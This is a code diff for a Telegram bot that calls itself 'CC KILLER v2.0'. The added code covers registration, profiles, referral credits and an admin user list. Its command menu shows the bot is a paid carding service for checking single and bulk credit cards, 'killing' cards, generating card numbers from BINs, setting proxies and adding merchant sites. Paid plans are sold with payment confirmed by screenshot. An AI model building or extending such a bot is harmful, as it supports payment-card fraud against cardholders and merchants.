 ⚠️ <b>IMPORTANT: Send payment screenshot to support after paying!</b>
-
-<b>Click a button below to request an upgrade:</b>
     """
     await message.reply(plans_text, reply_markup=InlineKeyboardMarkup([
         [InlineKeyboardButton("🔰 BASIC", callback_data="req_BASIC"), InlineKeyboardButton("🚀 STANDARD", callback_data="req_STANDARD")],
@@ -1012,44 +1234,192 @@ async def generate_cards_cmd(client, message):
     
     await message.reply(response)
 
+# ========== REGISTRATION COMMANDS ==========
+@app.on_message(filters.command("register") & authorized_filter)
+async def register_cmd(client, message):
+    """Register new user with optional referral code."""
+    user = message.from_user
+    user_id = user.id
+    
+    # Check if already registered
+    existing = await db.get_user(user_id)
+    if existing and existing.get('is_registered'):
+        return await message.reply(
+            f"✅ <b>Already Registered!</b>\n\n"
+            f"👤 User: <b>{user.first_name}</b>\n"
+            f"🆔 ID: <code>{user_id}</code>\n\n"
+            f"Use /profile to view your profile."
+        )
+    
+    # Check for referral code in command
+    referral_code = None
+    if len(message.command) > 1:
+        referral_code = message.command[1].strip().upper()
+    
+    # Register user
+    user_data = await db.create_user(
+        user_id=user_id,
+        username=user.username,
+        first_name=user.first_name,
+        referral_code=referral_code
+    )
+    
+    if user_data:
+        welcome_msg = f"""
+🎉 <b>REGISTRATION SUCCESSFUL!</b>
+━━━━━━━━━━━━━━━━━━━━━━━
+👤 <b>User:</b> {user.first_name}
+🆔 <b>ID:</b> <code>{user_id}</code>
+💳 <b>Credits:</b> 10 (Welcome Gift!)
+🎁 <b>Your Referral Code:</b> <code>{user_data.get('referral_code')}</code>
+"""
+        if referral_code and user_data.get('referred_by'):
+            welcome_msg += f"\n✅ <b>Referred by:</b> User #{user_data.get('referred_by')} (They got +10 credits!)"
+        
+        welcome_msg += "\n\nUse /profile to view your profile and /referral to share your code!"
+        
+        await message.reply(welcome_msg)
+    else:
+        await message.reply("❌ <b>Registration failed!</b> Please try again later.")
+
+@app.on_message(filters.command("profile") & authorized_filter)
+async def profile_cmd(client, message):
+    """View user profile."""
+    user_id = message.from_user.id
+    user_data = await db.get_user(user_id)
+    
+    if not user_data or not user_data.get('is_registered'):
+        return await message.reply("❌ <b>Not registered!</b>\nUse /register to create your account.")
+    
+    referral_stats = await db.get_referral_stats(user_id)
+    
+    profile_text = f"""
+👤 <b>YOUR PROFILE</b>
+━━━━━━━━━━━━━━━━━━━━━━━
+👤 <b>Name:</b> {user_data.get('first_name', 'N/A')}
+📛 <b>Username:</b> @{user_data.get('username', 'N/A')}
+🆔 <b>ID:</b> <code>{user_id}</code>
+
+💰 <b>Credits:</b> {'UNLIMITED' if user_data.get('is_vip') else user_data.get('credits', 0)}
+📈 <b>Plan:</b> {user_data.get('plan', 'FREE')}
+{'<b>VIP:</b> ✅ Yes' if user_data.get('is_vip') else ''}
+{f"<b>Expiry:</b> {user_data.get('expiry')}" if user_data.get('expiry') else ''}
+
+🎁 <b>REFERRAL STATS</b>
+├ 🔗 Code: <code>{referral_stats.get('referral_code', 'N/A')}</code>
+└ 👥 Referrals: {referral_stats.get('referral_count', 0)}
+
+📅 <b>Joined:</b> {user_data.get('joined_at', 'N/A')}
+    """
+    
+    await message.reply(profile_text)
+
+@app.on_message(filters.command("referral") & authorized_filter)
+async def referral_cmd(client, message):
+    """Get referral link and stats."""
+    user_id = message.from_user.id
+    user_data = await db.get_user(user_id)
+    
+    if not user_data or not user_data.get('is_registered'):
+        return await message.reply("❌ <b>Not registered!</b>\nUse /register to create your account.")
+    
+    referral_code = user_data.get('referral_code')
+    referral_count = user_data.get('referral_count', 0)
+    
+    # Get bot username for deep link
+    bot_info = await client.get_me()
+    bot_username = bot_info.username
+    
+    referral_text = f"""
+🎁 <b>YOUR REFERRAL LINK</b>
+━━━━━━━━━━━━━━━━━━━━━━━
+🔗 <b>Your Code:</b> <code>{referral_code}</code>
+📎 <b>Share Link:</b>
+<code>https://t.me/{bot_username}?start=ref_{referral_code}</code>
+
+📊 <b>Stats:</b>
+├ 👥 Total Referrals: {referral_count}
+└ 💰 Credits Earned: {referral_count * 10}
+
+<i>💡 Share your code! When someone registers with your code, YOU get <b>+10 Credits!</b></i>
+    """
+    
+    await message.reply(referral_text)
+
+@app.on_message(filters.command("users") & filters.user(OWNER_ID))
+async def admin_users_cmd(client, message):
+    """Admin command to view all registered users."""
+    page = 0
+    if len(message.command) > 1:
+        try:
+            page = int(message.command[1]) - 1
+            if page < 0: page = 0
+        except: pass
+    
+    limit = 15
+    offset = page * limit
+    
+    total_users = await db.get_user_count()
+    users = await db.get_all_users(limit=limit, offset=offset)
+    
+    if not users:
+        return await message.reply("📭 <b>No registered users found.</b>")
+    
+    users_text = f"""
+👥 <b>REGISTERED USERS</b> (Page {page + 1})
+━━━━━━━━━━━━━━━━━━━━━━━
+📊 <b>Total:</b> {total_users} users
+
+"""
+    
+    for i, user in enumerate(users, offset + 1):
+        vip_badge = "👑" if user.get('is_vip') else ""
+        users_text += f"{i}. {vip_badge} <code>{user.get('user_id')}</code> | {user.get('first_name', 'N/A')} | 💳 {user.get('credits', 0)}\n"
+    
+    users_text += f"\n<i>Use /users {page + 2} for next page</i>"
+    
+    await message.reply(users_text)
+
 if __name__ == "__main__":
     from pyrogram import idle
     from pyrogram.types import BotCommand
     
     async def main():
-        # Auto-Restart Logic for FloodWait
+        # Initialize database
+        print("🗄️ Initializing database...")
+        await db.init()
+        print("✅ DATABASE READY")
+        
         while True:
             try:
                 await app.start()
-                break # Success!
+                break
             except Exception as e:
                 error_str = str(e)
                 if "FLOOD_WAIT" in error_str or "420" in error_str:
                     import re
                     match = re.search(r'\d+', error_str)
                     seconds = int(match.group()) if match else 300
-                    wait_time = seconds + 10 # Buffer
+                    wait_time = seconds + 10
                     print(f"⚠️ FLOOD WAIT DETECTED! Sleeping for {wait_time}s to fix... (DO NOT RESTART)")
                     await asyncio.sleep(wait_time)
                     print("♻️ RETRYING CONNECTION...")
-                    # Loop continues to retry
                 else:
-                    raise e # Other errors crash normally
+                    raise e
 
         print("🚀 CC KILLER v2.0 STARTED")
         
-        # Auto-Set Commands for "/" suggestion
         commands = [
             BotCommand("start", "Start Bot / Menu"),
+            BotCommand("register", "Register Account"),
+            BotCommand("profile", "View Profile"),
+            BotCommand("referral", "Get Referral Link"),
             BotCommand("chk", "Check Single Card"),
-            BotCommand("mchk", "Mass Check (All Gates)"),
+            BotCommand("mchk", "Mass Check Cards"),
+            BotCommand("kl", "CC Killer (Single)"),
             BotCommand("gen", "Generate Cards from BIN"),
             BotCommand("setproxy", "Set Proxy"),
             BotCommand("viewproxy", "View Proxy"),
-            BotCommand("str", "Check Stripe"),
-            BotCommand("mstr", "Mass Check Stripe"),
-            BotCommand("shp", "Check Shopify"),
-            BotCommand("mshp", "Mass Check Shopify"),
             BotCommand("addsite", "Add Merchant Site"),
             BotCommand("listsites", "View Sites"),
             BotCommand("plans", "View Plans")
@@ -1060,7 +1430,6 @@ if __name__ == "__main__":
         except Exception as e:
             print(f"❌ Failed to set commands: {e}")
         
-        # Initialize Queue System
         from queue_manager import init_queue
         await init_queue()
         print("✅ QUEUE SYSTEM READY")
